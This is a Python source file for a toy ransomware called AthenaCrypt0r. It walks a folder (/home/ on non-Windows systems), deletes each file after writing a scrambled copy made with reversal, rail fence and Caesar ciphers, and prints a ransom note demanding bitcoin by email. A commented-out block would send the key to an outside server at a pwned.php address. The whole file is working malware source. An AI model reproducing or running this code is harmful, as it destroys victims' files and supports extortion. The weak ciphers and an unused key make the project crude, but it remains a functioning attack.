import getdirs
import os
import hashlib as h
import random as r
import time as t
import urllib.request
import reverseCryptor as rc
import caeser as ca
import railfence as rail

def generateKey():	
    keyName = "\x43\x72\x79\x70\x74\x30\x72" #Secret for keygen	
    salt = map(ord, keyName) # run KeyName through the ord function, set the value to salt	
    r.seed(int(t.time()+r.randint(1,1337))) # generate a peusdo random seed for random	
    key = h.pbkdf2_hmac('sha512', bytes(r.randint(1, 65500)), bytes(salt), r.randint(30000,60000)) # generate the encryption key - SHA512 salted, ran over a random amount of times	
    encryptionKey = key.hex() # dump the key	

    return encryptionKey #return it to the main function	


def main(key):

    if os.name == "nt":
        path = "C:/TestFolder/"
    else:
        path = "/home/"

    files = getdirs.getdirs(path)

    Crypter(files)
    #Decrypter(files)
    bitcoin = r.random()

    ''' # supposed to send the generated key to an external server for identification
    data = parse.urlencode(key).encode()
    req =  request.Request("http://AthenaMalware.io/pwned.php", data=data) 
    resp = request.urlopen(req)
    '''
    
    print("============================================================================================")
    print("All your files have been encrypted with AthenaCrypt0r :)")
    print("To ever see your files again, please email athena@protonmail.ch with the following key: "+key)
    print("Please be prepared to pay "+ str(bitcoin) + " BTC for the safe release of your files")
    print("You can learn how to buy bitcoin here: https://www.coinbase.com/buy-bitcoin")
    print("============================================================================================")
    input("Please press any key to exit.")


def Crypter(files):
    outputfile = ".AthenaCrypt0r"
    key = 3 
    shift = 13
    for file in files:
        f = open(file, "r")
        contents = f.read()
        #print(contents)
        f.close()
        os.remove(file)
        stage1 = rc.reverse(contents) # run through all 3 algorithms to produce a product cipher
        stage2 = rail.encryptRailFence(stage1, key)
        stage3 = ca.caesar(stage2, shift)
        f1 = open(file+outputfile, "w")
        f1.write(stage3)
        f1.close()

"""def Decrypter(files):
    #outputfile = ".AthenaCrypt0r"
    shift = -13
    key = 3
    #stage3 -> stage2 -> stage1 -> write out product
    for file in files:
        f = open(file, "r")
        contents = f.read()
        f.close()
        os.remove(file)
        stage1 = ca.caesar(contents, shift)
        stage2 = rail.decryptRailFence(stage1, key)
        stage3 = rc.reverse(stage2)
        f1 = open(file, "w")
        f1.write(stage3)
        f1.close()
"""
if __name__=="__main__":
    main(generateKey())